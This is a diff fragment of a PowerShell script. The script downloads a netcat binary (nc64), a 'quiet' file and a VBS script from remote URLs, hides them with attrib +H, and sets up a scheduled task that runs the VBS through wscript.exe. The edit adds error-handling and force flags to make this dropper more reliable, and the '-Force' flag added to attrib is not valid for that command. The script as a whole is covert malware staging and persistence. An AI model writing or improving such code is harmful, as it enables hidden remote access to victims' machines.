@@ -15,14 +15,14 @@ if (-not (Test-Path $installPath)) {
 }
 
 # Download the files
-Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
-Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
-Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
+Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -ErrorAction Stop
+Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -ErrorAction Stop
+Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -ErrorAction Stop
 
 # Make the downloaded files hidden
-attrib +H $quietTxtPath
-attrib +H $nc64TxtPath
-attrib +H $scriptVbsPath
+attrib +H $quietTxtPath -Force
+attrib +H $nc64TxtPath -Force
+attrib +H $scriptVbsPath -Force
 
 # Define the action to run script.vbs using wscript.exe
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $scriptVbsPath
